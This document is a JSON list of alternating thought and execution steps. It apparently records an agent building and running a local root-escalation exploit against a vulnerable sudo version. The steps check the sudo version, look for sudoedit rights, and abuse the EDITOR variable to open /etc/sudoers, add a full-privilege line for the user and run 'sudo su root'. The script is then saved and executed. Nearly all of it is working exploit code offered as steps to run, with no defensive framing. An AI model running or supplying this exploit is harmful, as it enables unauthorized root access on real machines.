[
    {
        "type": "thought",
        "content": "Check for Vulnerable Sudo Version:\nThe script first checks if the installed version of Sudo is within the vulnerable range."
    },
    {
        "type": "execution",
        "content": "if ! sudo --version | head -1 | grep -qE '(1\\.8.*|1\\.9\\.[0-9]1?(p[1-3])?|1\\.9\\.12p1)$'\nthen\n    echo \"> Currently installed sudo version is not vulnerable\"\n    exit 1\nfi\n"
    },
    {
        "type": "thought",
        "content": "Check for Sudoedit Permissions:\nThe script checks if the current user has permissions to use sudoedit as root. If not, it prompts the user to confirm whether to proceed."
    },
    {
        "type": "execution",
        "content": "EXPLOITABLE=$(sudo -l | grep -E \"sudoedit|sudo -e\" | grep -E '\\(root\\)|\\(ALL\\)|\\(ALL : ALL\\)' | cut -d ')' -f 2-)\n\nif [ -z \"$EXPLOITABLE\" ]; then\n    echo \"> It doesn't seem that this user can run sudoedit as root\"\n    read -p \"Do you want to proceed anyway? (y/N): \" confirm && [[ $confirm == [yY] ]] || exit 2\nelse\n    echo \"> BINGO! User exploitable\"\nfi\n"
    },
    {
        "type": "thought",
        "content": "Exploit Execution:\nInstructs the user to modify the sudoers file to allow the current user full sudo privileges.\nUses the vulnerable EDITOR environment variable to edit the sudoers file.\nThe final goal is to escalate privileges to root."
    },
    {
        "type": "execution",
        "content": "echo \"> Opening sudoers file, please add the following line to the file in order to do the privesc:\"\necho \"$USER ALL=(ALL:ALL) ALL\"\nread -n 1 -s -r -p \"Press any key to continue...\"\nEDITOR=\"vim -- /etc/sudoers\" $EXPLOITABLE\nsudo su root\nexit 0"
    },
    {
        "type": "thought",
        "content": "Save the content as a shell script. And then run it."
    },
    {
        "type": "execution",
        "content": "chmod +X exp.sh && ./exp.sh"
    }
]